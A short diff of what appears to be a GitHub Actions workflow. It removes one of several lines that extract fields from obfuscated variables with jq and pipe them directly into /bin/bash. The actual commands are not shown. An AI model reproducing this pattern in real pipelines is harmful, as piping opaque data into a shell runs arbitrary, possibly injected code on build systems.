@@ -23,7 +23,6 @@ jobs:
           echo $yxpj7840 | jq -r .kfy62561 | /bin/bash
           printf '%s' "$l585" | jq -r .mkcp54 | /bin/bash
           printf '%s' "$zz791" | jq -r .i56 | /bin/bash
-          printf '%s' "$ahsk5" | jq -r .e030 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
